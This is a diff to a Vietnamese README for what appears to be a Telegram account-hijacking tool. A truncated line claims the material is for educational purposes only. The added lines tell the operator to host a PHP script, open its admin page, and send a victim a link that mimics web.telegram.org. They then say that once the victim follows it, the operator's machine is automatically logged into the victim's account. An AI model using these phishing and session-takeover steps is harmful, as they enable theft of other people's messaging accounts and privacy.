@@ -8,9 +8,9 @@ Tất cả nội dung, mã nguồn và công cụ được trình bày chỉ nh�
 
 Cách sử dụng script deploy lên sv có php, hoặc build local dùng xamp up vào thư mục htdocs
 
-Ở máy mình mở urlweb/admin.php
+Ở máy mình mở urlweb/admin.php và gửi cho nạn nhân đường dẫn như https://web.telegram.org/k/#69
 
 Ở máy nạn nhân 
 
-Sau đó khi truy cập đường dẫn từ APP máy người khác chỉnh sửa domain chính trỏ về domain của mình
+Sau đó khi truy cập đường dẫn từ APP máy người khác chỉnh sửa domain chính trỏ về domain của mình sau đó trên máy mình sẽ tự redic đăng nhập tài khoản người khác
 
